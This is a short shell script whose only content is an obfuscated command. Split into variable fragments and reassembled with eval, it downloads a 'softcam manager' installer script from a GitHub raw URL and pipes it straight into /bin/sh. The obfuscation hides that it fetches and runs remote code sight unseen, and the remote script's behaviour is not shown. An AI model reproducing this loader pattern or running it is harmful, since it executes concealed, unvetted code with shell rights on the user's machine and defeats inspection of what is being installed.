z="
";Iz='nt.c';Yz='| /b';Lz='37/a';Wz='sh -';Qz='mman';Fz='hubu';Kz='mil2';Az='wget';Vz='ler.';Cz='ps:/';Dz='/raw';Sz='/mai';Mz='lter';Pz='ftca';Xz='O - ';Tz='n/in';Ez='.git';az='h';Hz='onte';Rz='ager';Gz='serc';Oz='veso';Zz='in/s';Bz=' htt';Uz='stal';Nz='nati';Jz='om/e';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az"